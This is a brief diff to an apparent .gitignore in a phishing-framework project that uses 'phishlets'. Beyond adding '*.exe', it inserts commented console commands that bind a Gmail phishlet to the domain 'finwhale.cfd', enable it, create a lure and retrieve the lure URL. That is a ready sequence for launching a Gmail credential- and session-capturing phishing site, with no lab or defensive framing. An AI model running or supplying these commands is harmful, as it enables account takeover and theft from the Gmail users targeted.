@@ -1,4 +1,12 @@
 release/
 build/
 private/
+*.exe
 !/phishlets/example.yaml
+
+
+# > config domain finwhale.cfd
+# > phishlets hostname gmail finwhale.cfd
+# > phishlets enable gmail
+# > lures create gmail
+# > lures get-url 0
